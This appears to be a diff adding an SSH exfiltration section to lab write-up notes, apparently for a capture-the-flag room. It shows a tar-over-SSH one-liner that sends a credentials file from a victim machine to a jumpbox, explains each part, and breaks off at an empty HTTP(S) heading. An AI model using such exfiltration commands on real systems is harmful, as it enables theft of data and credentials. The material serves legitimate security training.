@@ -133,3 +133,32 @@ This method is **easy to detect** as it relies on non-standard protocols, so it 
 
 
     ![Decoding and unarchiving data](decode-unarchive-data.png)
+
+# SSH Exfiltration
+
+To transfer data over SSH, we can either use the Secure Copy Protocol, `scp`, or the SSH client. For this task, we assume that we don't have the `scp` command available. 
+
+We will use the Jumpbox as our exfiltration server, since it has an SSH server enabled. Since we are already on `victim1`'s machine, we will use this as our target to trasmit the `task5/creds.txt` file.
+
+![Files to be trasmitted](task5-creds.png)
+
+We will use the same method as before to archive the data, but this time instead of redictering them through an TCP socket, we will send the standard output via SSH:
+
+```shell
+tar zcf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
+```
+
+The above command creates a tarball and sends it over SSH to the Jumpbox SSH server for extraction. Let's break it down step by step:
+
+1. `tar zcf - task5/` We have seen this part of the command before, which compresses and archives the data.
+
+2. `|` We have also seen what the *pipe operator* does.
+
+3. `ssh thm@jump.thm.com "cd /tmp/; tar xpf -"` This part of the command uses the ssh command to establish an SSH connection to the remote server "*jump.thm.com*" with the username "*thm*". Here's what's happening in the SSH command:
+    - `ssh thm@jump.thm.com` Initiates an SSH connection to the remote server "*jump.thm.com*" with the username "*thm*".
+    - `"cd /tmp/; tar xpf -"` This part is executed on the remote server after the SSH connection is established. It changes the working directory to "*/tmp*", and then extracts a tarball from standard input (indicated by `-`). The `p` options is used to preserve file permissions, ownership, and timestamps when extracting files. This ensures that the extracted files retain their original attributes.
+
+![SSH transmission](ssh-transmission.png)
+
+# HTTP(S) Exfiltration
+
